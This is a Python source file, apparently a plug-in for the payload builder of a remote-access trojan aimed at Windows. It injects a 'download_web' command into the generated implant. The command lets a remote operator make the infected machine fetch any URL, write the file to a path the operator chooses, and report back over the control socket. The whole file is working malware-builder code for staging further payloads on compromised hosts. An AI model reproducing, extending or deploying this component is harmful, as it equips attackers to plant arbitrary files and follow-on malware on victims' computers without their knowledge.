import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from urllib.request import urlopen, unquote')
        config.functions.append('''   
def download_web(command):
    url = command.split(' ')[1]
    file_name = command.split(' ')[2]
    response = urlopen(url)
    url_data = response.read()
    f = open(file_name, 'wb')
    f.write(url_data)
    f.close()
    s.sendall(('[+]Downloaded : ' + url + ' -> ' + file_name).encode())''')
        config.logics.append('''
            elif command == "download_web":
                download_web(data)''')
        config.help_menu['download_web <url> <Remote file path>'] = 'Allows you to download a file from a url supplied to a specified remote file path'
    elif option == 'info':
        print('\nName             : Download web component' \
              '\nOS               : Windows' \
              '\nRequired Modules : urllib' \
              '\nCommands         : download_web <url> <Remote file path>' \
              '\nDescription      : Allows you to download a file from a url supplied\n')
